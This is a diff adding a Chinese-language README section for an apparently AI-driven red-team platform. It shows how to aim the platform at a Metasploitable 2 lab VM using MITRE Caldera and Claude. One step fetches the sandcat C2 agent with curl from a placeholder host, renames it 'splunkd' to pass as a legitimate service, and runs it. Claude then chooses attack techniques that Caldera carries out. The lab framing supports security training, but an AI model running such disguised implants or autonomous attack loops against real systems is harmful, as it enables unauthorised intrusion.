@@ -353,6 +353,70 @@ MOCK_LLM=false
 MOCK_CALDERA=false
 ```
 
+### 真實靶機攻擊模式（Metasploitable / 靶機 VM）
+
+當你準備好打真實靶機（如 Metasploitable 2）：
+
+**1. 設定環境變數**
+
+```bash
+MOCK_LLM=false
+MOCK_CALDERA=false
+ANTHROPIC_API_KEY=sk-ant-...      # 真實 Claude API Key
+CALDERA_API_KEY=ADMIN123456       # 對應 caldera/local.yml
+```
+
+**2. 啟動完整 stack（含 Caldera）**
+
+```bash
+docker compose up -d
+# 驗證 Caldera 啟動
+curl http://localhost:58888/api/v2/health
+```
+
+**3. 建立作戰並新增靶機目標**
+
+```bash
+# 建立作戰
+curl -X POST http://localhost:58000/api/operations \
+  -H "Content-Type: application/json" \
+  -d '{"code":"OP-META-001","name":"Metasploitable Attack","codename":"NIGHT-HAWK","strategic_intent":"Exploit Metasploitable 2 靶機"}'
+
+# 新增靶機為 target（替換 IP 為你的靶機 IP）
+curl -X POST http://localhost:58000/api/operations/{op_id}/targets \
+  -H "Content-Type: application/json" \
+  -d '{"hostname":"metasploitable","ip_address":"192.168.x.x","os":"Ubuntu 8.04","role":"Target VM"}'
+```
+
+**4. 在靶機上部署 Caldera Agent**
+
+SSH 進入靶機，下載並執行 sandcat agent：
+
+```bash
+# 在靶機上執行（將 CALDERA_IP 替換為你的主機 IP）
+curl -s -X POST http://CALDERA_IP:58888/file/download \
+  -H "platform: linux" -H "file: sandcat.go" -o splunkd && chmod +x splunkd
+./splunkd -server http://CALDERA_IP:58888 -group red &
+```
+
+**5. 同步 Agent 與 Technique**
+
+```bash
+# 從 Caldera 同步 agent
+curl -X POST http://localhost:58000/api/operations/{op_id}/agents/sync
+
+# 從 Caldera 同步 abilities（自動映射 MITRE ID）
+curl -X POST http://localhost:58000/api/techniques/sync-caldera
+```
+
+**6. 啟動 OODA 循環**
+
+```bash
+curl -X POST http://localhost:58000/api/operations/{op_id}/ooda/trigger
+```
+
+Claude AI 將分析態勢、推薦技術，Caldera 將透過 agent 在靶機上真實執行攻擊。
+
 ---
 
 ## 常見問題
